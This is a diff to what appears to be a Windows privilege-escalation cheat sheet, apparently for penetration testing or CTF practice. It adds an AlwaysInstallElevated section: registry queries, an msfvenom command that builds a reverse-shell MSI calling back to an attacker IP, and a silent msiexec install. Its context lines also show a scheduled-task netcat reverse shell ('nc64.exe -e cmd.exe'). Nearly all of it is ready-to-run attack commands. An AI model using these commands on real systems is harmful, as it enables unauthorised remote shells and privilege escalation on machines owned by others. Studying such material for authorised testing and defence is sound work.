@@ -6,6 +6,7 @@
 * [Internet Information Services Configuration](#internet-information-services-configuration)
 * [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
 * [Scheduled Tasks](#scheduled-tasks)
+* [AlwaysInstallElevated](#alwaysinstallelevated)
 
 *********************************************************************************
 Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
@@ -97,6 +98,26 @@ echo c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT] > C:\tasks\schtask.bat
 schtasks /run /tn [TASK-NAME]
 ```
 Check to see if the reverse shell connected
+
+********************************************
+
+## AlwaysInstallElevated
+
+This method requires two registry values to be set. You can query these from the command line using the commands below:
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
+```
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
 
 ********************************************
 
